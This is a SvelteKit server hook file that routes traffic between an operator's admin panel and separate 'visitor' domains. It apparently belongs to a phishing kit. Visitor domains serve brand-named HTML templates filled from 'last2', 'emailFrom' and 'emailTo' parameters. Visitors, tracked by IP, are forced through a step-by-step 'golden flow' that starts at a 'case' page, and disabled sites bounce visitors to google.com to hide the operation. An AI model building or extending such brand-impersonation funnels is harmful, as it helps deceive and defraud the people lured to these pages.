import type { Handle } from '@sveltejs/kit';
import { redirect } from '@sveltejs/kit';
import { SESSION_COOKIE, getSessionUser, maybeCleanupSessions } from '$lib/server/auth.js';
import { setupWebSocket } from '$lib/server/websocket.js';
import { getOrCreateApiKey } from '$lib/server/api.js';
import { dbGetDomainByHost, dbGetSetting } from '$lib/server/database.js';
import { resolveVisitorTemplate } from '$lib/server/visitorRouter.js';
import { getFlowLandingPath } from '$lib/server/funnel.js';
import { loadTemplateHtml } from '$lib/server/visitorTemplates.js';
import { serverState } from '$lib/server/state.js';
import {
	GOLDEN_FLOW_STEPS,
	isStepAllowed,
	resolveNextStep,
	markStepInProgress,
	ensureFlowInitialized,
	flowStepToUrl
} from '$lib/server/goldenFlow.js';
import type { Server } from 'node:http';

const PANEL_HOST = (process.env.PANEL_HOST || '').trim().toLowerCase();

if (!PANEL_HOST && process.env.NODE_ENV === 'production') {
	console.error('[SECURITY] PANEL_HOST is not set! All hosts will serve the admin panel. Set PANEL_HOST to your panel domain.');
}

/** Prefer reverse-proxy / client Host header over event.url (ORIGIN may pin URL to 127.0.0.1). */
function getRequestHost(event: Parameters<Handle>[0]['event']): string {
	const forwarded = event.request.headers.get('x-forwarded-host');
	const header = event.request.headers.get('host');
	const raw = forwarded?.split(',')[0]?.trim() || header || event.url.hostname;
	return raw.split(':')[0].trim().toLowerCase();
}

const PUBLIC_ROUTES = ['/login', '/signup'];
const PUBLIC_PREFIXES = [
	'/api/auth/',
	'/api/visitor/',
	'/api/data/',
	'/api/host/',
	'/api/gmail/callback',
	'/preview/',
	'/templates/preview/',
	'/u/',
	'/images/',
	'/_next/',
	'/_app/',
	'/favicon'
];

const VISITOR_ALLOWED_PREFIXES = [
	'/_app/',
	'/_next/',
	'/images/',
	'/favicon',
	'/template-thumbs/',
	'/api/visitor/',
	'/api/data/',
	'/api/host/',
	'/u/'
];

let wsAttached = false;

function attachWebSocket(httpServer: Server): void {
	if (wsAttached) return;
	wsAttached = true;
	setupWebSocket(httpServer);
	getOrCreateApiKey();
	console.log('[ws] WebSocket server attached at /ws (production)');
}

export const handle: Handle = async ({ event, resolve }) => {
	maybeCleanupSessions();

	if (!wsAttached) {
		try {
			const req = (event.platform as any)?.req;
			const httpServer: Server | undefined = req?.socket?.server;
			if (httpServer) {
				attachWebSocket(httpServer);
			}
		} catch {
			// platform.req not available (e.g. dev mode — Vite plugin handles it)
		}
	}

	const host = getRequestHost(event);
	const path = event.url.pathname;

	if (PANEL_HOST && host !== PANEL_HOST) {
		const siteEnabled = dbGetSetting('visitor.site_enabled');
		if (siteEnabled === '0') {
			return new Response(null, {
				status: 302,
				headers: { Location: 'https://www.google.com' }
			});
		}

		const landingEnabled = dbGetSetting('visitor.landing_enabled');
		if (landingEnabled === 'false') {
			console.warn(`[route] 404 landing disabled host=${host} panel=${PANEL_HOST} path=${path}`);
			return new Response('Not Found', { status: 404 });
		}

		const domain = dbGetDomainByHost(host);
		if (!domain || !domain.serving) {
			console.warn(`[route] 404 no visitor domain host=${host} panel=${PANEL_HOST} path=${path}`);
			return new Response('Not Found', { status: 404 });
		}

		event.locals.user = null;
		event.locals.sessionToken = undefined;
		event.cookies.delete(SESSION_COOKIE, { path: '/' });

		if (VISITOR_ALLOWED_PREFIXES.some((p) => path.startsWith(p))) {
			return resolve(event);
		}

		const tpl = resolveVisitorTemplate(domain.module, path);
		if (tpl) {
			const requestedLabel = `${tpl.brand}/${tpl.page}`;
			let visitorIp = '';
			try { visitorIp = event.getClientAddress() || ''; } catch { /* address unavailable */ }
			const visitor = visitorIp ? serverState.visitors.get(visitorIp) : undefined;
			const firstStep = GOLDEN_FLOW_STEPS[0];
			const caseIdUrl = flowStepToUrl(firstStep, domain.module);

			if (!visitor) {
				if (requestedLabel !== firstStep && caseIdUrl && caseIdUrl !== path) {
					return new Response(null, {
						status: 302,
						headers: { Location: caseIdUrl }
					});
				}
			} else if (!visitor.flowBypassed) {
				ensureFlowInitialized(visitor);

				if (visitor.flowSteps.length > 0) {
					if (!isStepAllowed(visitor.flowSteps, requestedLabel)) {
						const nextLabel = resolveNextStep(visitor.flowSteps);
						if (nextLabel) {
							const redirectUrl = flowStepToUrl(nextLabel, domain.module);
							if (redirectUrl && redirectUrl !== path) {
								return new Response(null, {
									status: 302,
									headers: { Location: redirectUrl }
								});
							}
						}
					} else {
						markStepInProgress(visitor, requestedLabel);
					}
				}
			}

			const html = loadTemplateHtml(tpl.brand, tpl.page, {
				lastTwoDigits: event.url.searchParams.get('last2') || undefined,
				emailFrom: event.url.searchParams.get('emailFrom') || undefined,
				emailTo: event.url.searchParams.get('emailTo') || undefined
			});
			if (html) {
				return new Response(html, {
					headers: {
						'Content-Type': 'text/html; charset=utf-8',
						'Cache-Control': 'no-store'
					}
				});
			}
		}

		const goldenLanding = flowStepToUrl(GOLDEN_FLOW_STEPS[0], domain.module);
		let landingRedirect = goldenLanding || '/case';
		return new Response(null, {
			status: 302,
			headers: { Location: landingRedirect }
		});
	}

	const token = event.cookies.get(SESSION_COOKIE);
	const user = getSessionUser(token);
	event.locals.user = user;
	event.locals.sessionToken = token;

	const isPublic =
		PUBLIC_ROUTES.includes(path) ||
		PUBLIC_PREFIXES.some((p) => path.startsWith(p)) ||
		path === '/';

	if (!user && !isPublic) {
		if (path.startsWith('/api/')) {
			return new Response(JSON.stringify({ error: 'Unauthorized' }), {
				status: 401,
				headers: { 'Content-Type': 'application/json' }
			});
		}
		const redirectTo = encodeURIComponent(path + event.url.search);
		throw redirect(303, `/login?redirect=${redirectTo}`);
	}

	if (user && (path === '/login' || path === '/signup')) {
		throw redirect(303, '/dashboard');
	}

	return resolve(event);
};
